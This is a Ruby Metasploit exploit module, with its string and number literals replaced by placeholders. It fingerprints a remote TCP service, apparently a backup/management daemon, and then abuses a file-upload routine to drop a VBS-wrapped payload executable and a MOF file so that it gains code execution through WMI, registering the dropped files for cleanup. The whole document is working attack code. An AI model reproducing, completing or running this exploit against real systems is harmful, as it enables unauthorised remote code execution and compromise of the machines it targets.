require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = GreatRanking include Msf :: Exploit :: Remote :: Tcp include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec include Msf :: Exploit :: FileDropper def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > true , <str> = > { <str> = > <int> , <str> = > true } , <str> = > { <str> = > <int> } , <str> = > <str> , <str> = > [ [ <str> , { } ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def check fingerprint = get_fingerprint if fingerprint . nil? return Exploit :: CheckCode :: Unknown end print_status ( <str> fingerprint <str> ) if fingerprint =~ <str> minor = $1 . to_i else return Exploit :: CheckCode :: Safe end if minor < <int> return Exploit :: CheckCode :: Vulnerable elsif minor == <int> return Exploit :: CheckCode :: Detected else return Exploit :: CheckCode :: Detected end end def exploit vbs_name = rand_text_alpha ( rand ( <int> ) + <int> ) + <str> exe = generate_payload_exe vbs = Msf :: Util :: EXE . to_exe_vbs ( exe ) mof_name = rand_text_alpha ( rand ( <int> ) + <int> ) + <str> mof = generate_mof ( mof_name , vbs_name ) print_status ( <str> vbs_name <str> ) upload_file ( <str> vbs_name <str> , vbs ) register_file_for_cleanup ( vbs_name ) print_status ( <str> mof_name <str> ) upload_file ( <str> mof_name <str> , mof ) register_file_for_cleanup ( <str> mof_name <str> ) end def build_pkt ( fields ) data = <str> fields . each do | v | data << <str> Rex :: Text . to_unicode ( v ) <str> data << Rex :: Text . to_unicode ( <str> ) end data . chomp! ( Rex :: Text . to_unicode ( <str> ) ) return [ data . length ] . pack ( <str> ) + data end def get_fingerprint ommni = connect ommni . put ( rand_text_alpha_upper ( <int> ) ) resp = ommni . get_once ( - <int> ) disconnect if resp . nil? return nil end return Rex :: Text . to_ascii ( resp ) . chop . chomp end def upload_file ( file_name , contents ) connect pkt = build_pkt ( [ <str> , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , <str> , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , rand_text_alpha ( <int> ) , <str> file_name <str> , contents ] ) sock . put ( pkt ) sock . get_once disconnect end end 
